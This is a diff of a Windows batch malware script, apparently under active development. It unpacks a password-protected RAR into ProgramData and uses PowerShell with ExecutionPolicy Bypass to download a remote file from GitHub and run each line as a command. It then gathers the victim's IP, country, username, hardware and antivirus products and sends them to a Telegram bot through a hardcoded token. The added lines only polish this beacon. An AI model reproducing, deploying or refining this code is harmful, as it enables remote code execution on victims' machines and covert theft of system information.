@@ -20,6 +20,7 @@ for %a in (%processList%) do (
 "%ProgramData%\dist\UnRAR.exe" x -y -p147852369 "%ProgramData%\dist\51654.rar" "%ProgramData%\dist\"
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$c = (Invoke-WebRequest 'https://raw.githubusercontent.com/githa0/0/0/0/confrus' -UseBasicParsing).Content; foreach ($line in $c -split \"`n\") { cmd /c $line }"
 
+chcp 65001 >nul
 setlocal EnableDelayedExpansion
 
 set "TOKEN=7596827129:AAHve80JA0SxOOH8vut4-yX_dGP3DqzOKF4"
@@ -33,28 +34,36 @@ for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { $json = Invoke-R
         set "Country=%c"
     )
 )
+if "%IP%"=="Unknown" set "IP=No IP"
+if "%Country%"=="Unknown" set "Country=No Country"
 
 set "Windows=Unknown"
 for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { (Get-CimInstance -ClassName Win32_OperatingSystem).Caption } catch { Write-Host 'Unknown' }"') do set "Windows=%a"
+if "%Windows%"=="Unknown" set "Windows=No Windows"
 
 set "CPU=Unknown"
 for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { (Get-CimInstance -ClassName Win32_Processor).Name } catch { Write-Host 'Unknown' }"') do set "CPU=%a"
+if "%CPU%"=="Unknown" set "CPU=No CPU"
 
 set "GPU=Unknown"
 for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { (Get-CimInstance -ClassName Win32_VideoController).Caption } catch { Write-Host 'Unknown' }"') do set "GPU=%a"
+if "%GPU%"=="Unknown" set "GPU=No GPU"
 
 set "Arch=Unknown"
 for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { if ([System.Environment]::Is64BitOperatingSystem) { Write-Host 'X64' } else { Write-Host 'X86' } } catch { Write-Host 'Unknown' }"') do set "Arch=%a"
+if "%Arch%"=="Unknown" set "Arch=N/A"
 
 set "Antivirus=No Antivirus"
-for /f "tokens=*" %a in ('powershell -Command "try { (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName) -join ', ' } catch { 'No Antivirus' }"') do (
+for /f "tokens=*" %a in ('powershell -Command "try { $antivirus = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -ErrorAction Stop; if ($antivirus) { $antivirus.displayName -join ', ' } else { 'No Antivirus' } } catch { 'No Antivirus' }"') do (
     set "Antivirus=%a"
 )
+if "%Antivirus%"=="No Antivirus" set "Antivirus=No Antivirus"
 
 set "UserName=%USERNAME%"
 set "Worker=%COMPUTERNAME%"
 
 powershell -NoProfile -Command ^
-  "$message = 'RUSYK' + [System.Environment]::NewLine + 'IP: %IP%' + [System.Environment]::NewLine + 'Country: %Country%' + [System.Environment]::NewLine + 'Worker: %Worker%' + [System.Environment]::NewLine + 'UserName: %UserName%' + [System.Environment]::NewLine + 'Windows: %Windows% %Arch%' + [System.Environment]::NewLine + 'CPU: %CPU%' + [System.Environment]::NewLine + 'GPU: %GPU%' + [System.Environment]::NewLine + 'Antivirus: %Antivirus%';" ^
+  "$message = 'RUS' + [System.Environment]::NewLine + 'IP: %IP%' + [System.Environment]::NewLine + 'Country: %Country%' + [System.Environment]::NewLine + 'Worker: %Worker%' + [System.Environment]::NewLine + 'UserName: %UserName%' + [System.Environment]::NewLine + 'Windows: %Windows% %Arch%' + [System.Environment]::NewLine + 'CPU: %CPU%' + [System.Environment]::NewLine + 'GPU: %GPU%' + [System.Environment]::NewLine + 'Antivirus: %Antivirus%';" ^
+  "[System.Console]::OutputEncoding = [System.Text.Encoding]::UTF8;" ^
   "try { Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message} } catch { Write-Host 'Error sending message to Telegram' }"
 endlocal
